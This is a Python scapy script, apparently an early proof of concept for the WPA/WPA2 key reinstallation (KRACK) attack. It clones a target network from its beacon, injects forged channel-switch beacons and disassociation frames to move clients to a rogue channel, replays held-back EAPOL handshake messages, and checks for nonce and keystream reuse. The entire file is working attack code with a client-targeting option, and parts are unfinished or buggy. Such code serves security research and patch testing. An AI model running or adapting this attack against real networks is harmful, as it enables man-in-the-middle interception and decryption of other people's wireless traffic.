#!/usr/bin/env python2
from scapy.all import *
import sys, os, struct, time, argparse, heapq
from datetime import datetime

CHANNEL_AP    = 1                   # Channel of the original AP
CHANNEL_CLONE = 11                  # Channel where the original AP will be cloned on
IFACE_MON     = "wlan2mon"	    # Interface on same channel as the real AP

IEEE_TLV_TYPE_SSID = 0
IEEE_TLV_TYPE_CSA  = 37

WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY = 4


#### Basic output and logging functionality ####

DEBUG, INFO, STATUS, WARNING, ERROR = range(5)
COLORCODES = { "gray"  : "\033[0;37m",
               "green" : "\033[0;32m",
               "orange": "\033[0;33m",
               "red"   : "\033[0;31m" }

# TODO: command-line argument to change this
loglevel = INFO
def log(level, msg, color=None, showtime=True):
	if level < loglevel: return
	if level == DEBUG   and color is None: color="gray"
	if level == WARNING and color is None: color="orange"
	if level == ERROR   and color is None: color="red"
	print (datetime.now().strftime('[%H:%M:%S] ') if showtime else " "*11) + COLORCODES.get(color, "") + msg + "\033[1;0m"


#### Packet Processing Functions ####

def get_eapol_msgnum(p):
	FLAG_PAIRWISE = 0b0000001000
	FLAG_ACK      = 0b0010000000
	FLAG_SECURE   = 0b1000000000

	if not EAPOL in p: return 0

	keyinfo = str(p[EAPOL])[5:7]
	flags = struct.unpack(">H", keyinfo)[0]
	if flags & FLAG_PAIRWISE:
		# 4-way handshake
		if flags & FLAG_ACK:
			# sent by server
			if flags & FLAG_SECURE: return 3
			else: return 1
		else:
			# sent by server
			if flags & FLAG_SECURE: return 4
			else: return 2

	return 0
			

#### Man-in-the-middle Setup Code ####

def xorstr(lhs, rhs):
	return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])

def recv_dot11(socket):
	p = socket.recv()
	if p == None or not Dot11 in p: return None
	# Hack: ignore frames that we just injected and are echoed back by the kernel
	if p[Dot11].FCfield & 0x20 != 0:
		log(DEBUG, "Ignoring echoed injected frame: %s (0x%02X)" % (dot11_to_str(p), p[Dot11].FCfield))
		return None
	return p[Dot11]

def send_dot11(socket, p):
	# Hack: set the More Data flag so we can detect injected frames
	p[Dot11].FCfield |= 0x20
	socket.send(RadioTap()/p)

def dot11_get_iv(p):
	"""Scapy can't handle Extended IVs, so do this properly ourselves"""
	if Dot11WEP not in p:
		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
		return 0

	wep = p[Dot11WEP]
	if wep.keyid & 32:
		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
	else:
		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)

def dot11_to_str(p):
	if Dot11Beacon in p:      return "Beacon(TSF=%d)" % p[Dot11Beacon].timestamp
	elif Dot11ProbeReq in p:  return "ProbeReq"
	elif Dot11ProbeResp in p: return "ProbeResp"
	elif Dot11Auth in p:      return "Auth"
	elif Dot11Deauth in p:    return "Deauth"
	elif Dot11AssoReq in p:   return "AssoReq"
	elif Dot11AssoResp in p:  return "AssoResp"
	elif Dot11Disas in p:     return "Disas"
	elif Dot11WEP in p:       return "EncryptedData(IV=%d)" % dot11_get_iv(p)
	elif EAPOL in p:
		if get_eapol_msgnum(p) != 0: return "EAPOL msg%d" % get_eapol_msgnum(p)
		else:                        return repr(p)
	return repr(p)

def print_rx(level, name, p, color=None):
	if color is None and Dot11Deauth in p: color="orange"
	log(level, "%s: %s -> %s: %s" % (name, p.addr2, p.addr1, dot11_to_str(p)), color=color)

def construct_csa():
	switch_mode = 1		# STA should not Tx untill switch is completed
	new_chan_num = 6	# Channel it should switch to -- FIXME do not hardcode this
	switch_count = 1	# Immediately make the station switch

	# Contruct the IE
	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
	return struct.pack("<BB", IEEE_TLV_TYPE_CSA, len(payload)) + payload

def append_csa(p):
	el = p[Dot11Elt]
	prevel = None
	while isinstance(el, Dot11Elt):
		prevel = el
		el = el.payload

	prevel.payload = construct_csa()

	return p

def get_tlv_value(p, type):
	if not Dot11Elt in p: return None
	el = p[Dot11Elt]
	while isinstance(el, Dot11Elt):
		if el.ID == IEEE_TLV_TYPE_SSID:
			return el.info
	return None


class NetworkConfig():
	def __init__(self):
		self.ssid = None
		self.channel = 0
		self.group_cipher = None
		self.wpavers = 0
		self.pairwise_ciphers = set()
		self.akms = set()

	def is_wparsn(self):
		return not self.group_cipher is None and self.wpavers > 0 and \
			len(self.pairwise_ciphers) > 0 and len(self.akms) > 0

	def parse_wparsn(self, wparsn):
		self.group_cipher = ord(wparsn[5])

		num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
		pos = wparsn[8:]
		for i in range(num_pairwise):
			self.pairwise_ciphers.add(ord(pos[3]))
			pos = pos[4:]

		num_akm = struct.unpack("<H", pos[:2])[0]
		pos = pos[2:]
		for i in range(num_akm):
			self.akms.add(ord(pos[3]))
			pos = pos[4:]

	def from_beacon(self, p):
		el = p[Dot11Elt]
		while isinstance(el, Dot11Elt):
			if el.ID == 0:
				self.ssid = el.info
			elif el.ID == 3:
				self.channel = ord(el.info[0])
			elif el.ID == 48:
				self.parse_wparsn(el.info)
				self.wpavers |= 2
			elif el.ID == 221 and el.info[:4] == "\x00\x50\xf2\x01":
				self.parse_wparsn(el.info[4:])
				self.wpavers |= 1

			el = el.payload

	def write_config(self, iface):
		TEMPLATE = """
interface={iface}
ssid={ssid}
channel={channel}

wpa={wpaver}
wpa_key_mgmt={akms}
wpa_pairwise={pairwise}
rsn_pairwise={pairwise}

hw_mode=g
auth_algs=3
wpa_passphrase=XXXXXXXX"""
		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
		ciphers2str = {2: "TKIP", 4: "CCMP"}
		return TEMPLATE.format(
			iface = iface,
			ssid = self.ssid,
			channel = self.channel,
			wpaver = self.wpavers,
			akms = " ".join([akm2str[idx] for idx in self.akms]),
			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]))


class ClientState():
	def __init__(self, macaddr):
		self.macaddr = macaddr
		self.reset()

	def reset(self):
		self.is_mitmed = False
		self.previv = None
		self.prevkeystream = None
		self.msg3s = []
		#self.msg4 = None


class DejaVuAttack():
	def __init__(self, nic_real, nic_rogue, ssid, clientmac=None):
		self.nic_real = nic_real
		self.nic_rogue = nic_rogue
		self.ssid = ssid
		self.beacon = None
		self.apmac = None

		# This is set in case of targeted attacks
		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()

		self.sock_real  = None
		self.sock_rogue = None
		self.clients = dict()
		self.disas_queue = []

	def find_beacon(self, ssid):
		p = sniff(count=1, timeout=2, lfilter=lambda p: get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
		if p is None or len(p) < 1: return
		self.beacon = p[0][Dot11]
		self.apmac = self.beacon.addr2

	def send_csa_beacon(self):
		csabeacon = append_csa(self.beacon)
		send_dot11(self.sock_real, csabeacon)
		log(STATUS, "Injected CSA beacon", color="green")

	def send_disas(self, macaddr):
		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
		send_dot11(self.sock_rogue, p)
		log(STATUS, "Injected Disassociation to %s" % macaddr, color="green")

	def queue_disas(self, macaddr):
		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
		heapq.heappush(self.disas_queue, (time.time() + 2, macaddr))

	def try_channel_switch(self, macaddr):
		self.send_csa_beacon()
		self.queue_disas(macaddr)

	def intercept_sentby_ap(self, p, client=None):
		if client and not client.is_mitmed: return

		eapolnum = get_eapol_msgnum(p)
		if not client is None and eapolnum == 3:
			client.msg3s.append(p)
			# FIXME: This may cause a timeout on the client side
			if len(client.msg3s) >= 3:
				for p in client.msg3s:
					send_dot11(self.sock_rogue, p)
				client.msg3s = []
				log(STATUS, "Got 3rd EAPOL msg3, will now forward all three msg3's", color="green", showtime=False)
			else:
				log(STATUS, "Not forwarding EAPOL msg3 (%d now queued)" % len(client.msg3s), color="green", showtime=False)
			return
		
		if p.addr1 != "ff:ff:ff:ff:ff:ff":
			send_dot11(self.sock_rogue, p)

	def handle_rx_realchan(self):
		p = recv_dot11(self.sock_real)
		if p == None: return

		# 1a. Track wether the targeted client is directly sending to the AP on the real channel
		if self.clientmac is not None and self.clientmac == p.addr2 and p.addr1 == self.apmac:
			print_rx(INFO, "Real channel ", p)
			if Dot11Auth in p:
				log(WARNING, "Client %s is connecting to the AP on the real channel. MitM failed." % self.clientmac)
				if p.addr2 in self.clients: self.clients[p.addr2].reset()
				self.try_channel_switch(p.addr2)
		# 1b. And display all other frames it is sending or receiving
		elif self.clientmac is not None and (self.clientmac in [p.addr1, p.addr2]) and (self.apmac in [p.addr1, p.addr2]):
			print_rx(INFO, "Real channel ", p)
		# 1c. Display other clients that are trying to authenticate on the real channel
		elif p.addr1 == self.apmac and Dot11Auth in p:
			print_rx(INFO, "Real channel ", p, color="orange")
			if p.addr2 in self.clients: self.clients[p.addr2].reset()
			self.try_channel_switch(p.addr2)

		# 3. Now focus on data send by the real AP to a client we are MitM'ing or want to target
		if p.addr2 != self.apmac: return
		if Dot11Beacon in p: print_rx(DEBUG, "Real channel ", p)
		if not p.addr1 in self.clients: return

		# Frames sent by the targeted client is already displayed, so display all others
		if p.addr1 != self.clientmac: print_rx(INFO, "Real channel ", p)

		self.intercept_sentby_ap(p, self.clients[p.addr1])

	def handle_rx_roguechan(self):
		p = recv_dot11(self.sock_rogue)
		if p == None: return

		# 1. Display frames sent by the rouge AP to the targeted client or MitM'ed client (and then ignore them)
		if (p.addr1 == self.clientmac or p.addr1 in self.clients) and p.addr2 == self.apmac:
			print_rx(INFO, "Rouge channel", p)
			return

		# 2. Now focus on data send by a MitM'ed (or about to be MitM'ed) client towards the AP
		if p.addr1 != self.apmac: return
		if not p.addr2 in self.clients and not Dot11Auth in p: return

		print_rx(INFO, "Rogue channel", p)

		# 3. Check if it's a new client that we can MitM
		if Dot11Auth in p:
			log(STATUS, "Successfully MitM'ed client %s" % p.addr2, color="green", showtime=False)
			self.clients[p.addr2] = ClientState(p.addr2)
			self.clients[p.addr2].is_mitmed = True

		# 4. TODO: Is it useful to check and set is_mitmed ???
		client = self.clients[p.addr2]
		if not client.is_mitmed: return None

		

		# 4. We block and store Msg4 to forward it when the attack is done -- FIXME encrypted Msg4's and forwarded anyway...??
		#eapolnum = get_eapol_msgnum(p)
		#if eapolnum == 4:
		#	client.msg4 = p
		#	log(STATUS, "Not forwarding EAPOL msg4 (TODO: Track reception?)", color="green")
		#	return

		# 5. Use encrypted frames to determine if the key reinstallation attack succeeded
		if Dot11WEP in p:
			# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
			plaintext = "\xaa\xaa\x03\x00\x00\x00\x88\x8e"
			encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
			keystream = xorstr(plaintext, encrypted)

			iv = dot11_get_iv(p)
			if client.previv == iv:
				# If the same keystream is reused, we have a normal key reinstallation attack
				if keystream == client.prevkeystream:
					log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)

				# Otherwise the client likely installed a new key, i.e., probably an all-zero key
				else:
					log(STATUS, "SUCCESS! Nonce reuse, with likely use of all-zero key.")
					log(STATUS, "Now directly MitM'ing using rogue AP ...", color="green", showtime=False)
					log(STATUS, "!!! TODO !!! Forwarding Msg4 to rogue AP to fully accept client", color="green", showtime=False)

					# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
					client.is_mitmed = False

			client.previv = iv
			client.prevkeystream = keystream

		send_dot11(self.sock_real, p)

	def run(self):
		# Make sure to use a recent backports driver package so we can indeed
		# capture and inject packets in monitor mode.
		self.sock_real  = conf.L2socket(type=ETH_P_ALL, iface=self.nic_real)
		self.sock_rogue = conf.L2socket(type=ETH_P_ALL, iface=self.nic_rogue)

		# Test monitor mode and get MAC address of the network -- FIXME: we can also attack any network its connected to
		self.find_beacon(self.ssid)
		if self.beacon is None:
			log(ERROR, "No beacon received of network <%s>. Is monitor mode working, and are you on the correct channel?" % self.ssid)
			return
		log(STATUS, "Target network detected: " + self.apmac, color="green")

		# Parse beacon and used this to generate a cloned hostapd.conf
		netconfig = NetworkConfig()
		netconfig.from_beacon(self.beacon)
		if not netconfig.is_wparsn():
			log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
			print netconfig.write_config(self.nic_rogue)
			return

		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
		log(ERROR, "TODO: Once modified hostapd is working properly, automatically start it")
		#with open("hostapd_rogue.conf", "w") as fp:
		#	fp.write(netconfig.write_config(self.nic_rogue))

		# Inject a CSA beacon to push victims to our channel -- FIXME: dynamic channel
		self.send_csa_beacon()

		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake
		if self.clientmac is None: log(STATUS, "Note: no target client given, so cannot inject Disassociation to force new handshake(s)")
		else:                      self.queue_disas(self.clientmac)

		# Continue attack by monitoring both channels and performing needed actions
		while True:
			sel = select([self.sock_rogue, self.sock_real], [], [], 0.5)
			if self.sock_real  in sel[0]: self.handle_rx_realchan()
			if self.sock_rogue in sel[0]: self.handle_rx_roguechan()
			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
				self.send_disas(self.disas_queue.pop()[1])


if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Key Reinstallation Attacks', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
	parser.add_argument('nic_real_ap', help='Wireless monitor interface that will listen on the channel of the target AP.')
	parser.add_argument('nic_rogue_ap', help='Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.')
	parser.add_argument('ssid', help='The SSID of the network to attack.')
	parser.add_argument('--clientmac', help='Only attack clients with the given MAC adress.')
	args = parser.parse_args()

	dejavu = DejaVuAttack(args.nic_real_ap, args.nic_rogue_ap, args.ssid, args.clientmac)
	dejavu.run()


